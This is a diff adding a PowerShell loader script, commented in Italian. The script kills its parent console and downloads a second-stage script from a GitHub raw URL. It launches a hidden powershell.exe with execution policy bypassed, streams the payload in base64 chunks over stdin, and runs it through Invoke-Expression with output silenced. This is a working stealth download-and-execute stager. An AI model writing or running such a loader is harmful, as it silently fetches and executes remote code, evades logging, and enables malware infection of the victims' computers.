@@ -1,0 +1,57 @@
+# ====================== VARIABILI
+$silent = $true  # true = nessun output, false = output visibile
+$url = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/second.txt"
+#=======================
+
+# KILL CMD PARENT PROCESS
+$parentProcessId = (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | Select -Expand ParentProcessId) 2>$null
+if ($parentProcessId) { Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue }
+
+$scriptString = (New-Object Net.WebClient).DownloadString($url)
+
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "powershell.exe"
+$psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass"
+$psi.UseShellExecute = $false
+$psi.RedirectStandardInput = $true
+$psi.RedirectStandardOutput = $true
+$psi.RedirectStandardError = $true
+$psi.CreateNoWindow = $true
+
+$process = [System.Diagnostics.Process]::Start($psi)
+
+$process.BeginOutputReadLine()
+$process.BeginErrorReadLine()
+
+Start-Sleep -Seconds 1.2
+
+$process.StandardInput.WriteLine('$ErrorActionPreference = "SilentlyContinue"')
+$process.StandardInput.Flush()
+Start-Sleep -Milliseconds 200
+
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptString))
+$chunkSize = 2000
+$chunks = [Math]::Ceiling($encoded.Length / $chunkSize)
+
+if (-not $silent) { Write-Host "[*] Invio script in $chunks chunk da $chunkSize char (totale B64: $($encoded.Length))" -ForegroundColor Cyan }
+
+$process.StandardInput.WriteLine('$_b64 = ""')
+$process.StandardInput.Flush()
+Start-Sleep -Milliseconds 150
+
+for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
+    $chunk = $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
+    $chunkNum = [Math]::Floor($i / $chunkSize) + 1
+    if (-not $silent) { Write-Host "[$chunkNum/$chunks] Invio chunk..." -ForegroundColor Yellow }
+    $process.StandardInput.WriteLine('$_b64 += "' + $chunk + '"')
+    $process.StandardInput.Flush()
+    Start-Sleep -Milliseconds 100
+}
+
+if (-not $silent) { Write-Host "[*] Esecuzione script..." -ForegroundColor Green }
+$process.StandardInput.WriteLine('[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($_b64)) | Invoke-Expression')
+$process.StandardInput.Flush()
+Start-Sleep -Milliseconds 500
+
+$process.StandardInput.Close()
+if (-not $silent) { Write-Host "[+] Done." -ForegroundColor Green }
